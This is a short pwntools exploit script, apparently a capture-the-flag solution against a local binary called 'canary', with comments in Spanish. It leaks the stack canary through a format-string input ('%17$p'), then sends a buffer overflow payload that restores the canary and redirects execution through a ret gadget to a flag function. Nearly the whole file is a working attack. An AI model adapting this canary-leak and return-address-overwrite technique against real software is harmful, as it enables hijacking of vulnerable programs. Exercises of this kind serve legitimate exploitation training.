from pwn import *

FLAG_ADDRESS = 0x0000000000400787
MAIN_RET = 0x00000000004009cf


p = process("./canary")
#attach(p)

p.recvuntil("Hi! What's your name?")
p.sendline("%17$p")

canary = p.recvline().split("!")[0].split()[-1]

print("El canario es: {}" .format(canary))
p.recvuntil("Anything else you want to tell me?")

payload = 'A'*56
payload += p64(int(canary, 16))
payload += 'A'*8
payload += p64(MAIN_RET)
payload += p64(FLAG_ADDRESS)



p.sendline(payload)

p.interactive()


#movaps XMMWORD PTR [rsp+0x40],xmm0 si aparece eso la stack no esta alineada por 
#lo que tienes que saltar a un ret y luego le metes la direccion de memoria a la 
#que vas a saltar ya que el ret coge la siguiente direcion que haya en la stack
